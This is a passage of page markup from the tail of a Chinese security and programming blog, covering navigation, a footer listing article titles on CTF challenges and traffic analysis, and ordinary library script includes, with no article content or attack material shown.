rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0151-170/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E5%85%B6%E5%AE%83/" title="分类于 其它">其它</a> <i class="ic i-angle-right"></i> <a href="/categories/%E5%85%B6%E5%AE%83/w10/" title="分类于 w10">w10</a></div><span><a href="/2024/04/16/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="关于TCP与UDP协议的学习">关于TCP与UDP协议的学习</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Misc/" title="分类于 Misc">Misc</a> <i class="ic i-angle-right"></i> <a href="/categories/MISC/" title="分类于 MISC">MISC</a> <i class="ic i-angle-right"></i> <a href="/categories/Misc/course-1/" title="分类于 比赛wp">比赛wp</a></div><span><a href="/2024/04/16/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E5%86%B3%E8%B5%9B%20Misc/" title="2023浙江省决赛 Misc">2023浙江省决赛 Misc</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WEB/" title="分类于 WEB">WEB</a></div><span><a href="/2024/04/16/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="CTFshow文件包含">CTFshow文件包含</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%B5%81%E9%87%8F/" title="分类于 流量">流量</a> <i class="ic i-angle-right"></i> <a href="/categories/%E6%B5%81%E9%87%8F/course-2/" title="分类于 流量分析">流量分析</a></div><span><a href="/2024/04/16/USB/" title="USB">USB</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/MISC/" title="分类于 MISC">MISC</a></div><span><a href="/2024/04/16/SHCTF%20MISC/" title="SHCTF MISC">SHCTF MISC</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/MISC/" title="分类于 MISC">MISC</a></div><span><a href="/2024/04/16/ACTF2023CTFer%20simulator/" title="ACTF2023CTFer simulator">ACTF2023CTFer simulator</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/python/" title="分类于 python">python</a></div><span><a href="/2024/04/16/Socket%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" title="Socket网络编程">Socket网络编程</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/GO/" title="分类于 GO">GO</a></div><span><a href="/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F/" title="go语言变量作用域">go语言变量作用域</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%B5%81%E9%87%8F/" title="分类于 流量">流量</a> <i class="ic i-angle-right"></i> <a href="/categories/%E6%B5%81%E9%87%8F/course-2/" title="分类于 流量分析">流量分析</a></div><span><a href="/2024/04/16/%E5%86%B0%E8%9D%8Ev3.0%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/" title="冰蝎v3.0流量浅析">冰蝎v3.0流量浅析</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/python/" title="分类于 python">python</a></div><span><a href="/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84/" title="Python学习------控制结构">Python学习------控制结构</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">nnnpc @ nnnpc's Blog</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2024/04/16/CTFshow文件包含/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>